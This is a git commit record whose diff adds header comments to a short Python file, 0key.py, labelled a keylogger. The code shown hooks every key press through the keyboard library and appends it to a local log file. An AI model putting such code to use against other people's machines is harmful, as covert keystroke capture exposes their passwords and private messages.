7e5e1b76b82e23c4591ac15ed2beb832398f6724
d0rk-devel <d0rk.devel@gmail.com>
2024-03-08 08:47:54 +0100

    init commit
    .

--- 0key.py
+++ 0key.py
@@ -1,3 +1,5 @@
+# python3.12.2
+# 0key keylogger 
 
 
 import keyboard
@@ -6,6 +8,7 @@ log_file = "keystrokes.log"
 def on_key_press(event):
     with open(log_file, "a") as f:
         f.write(event.name)
+
 
 keyboard.on_press(on_key_press)
 # .wait 
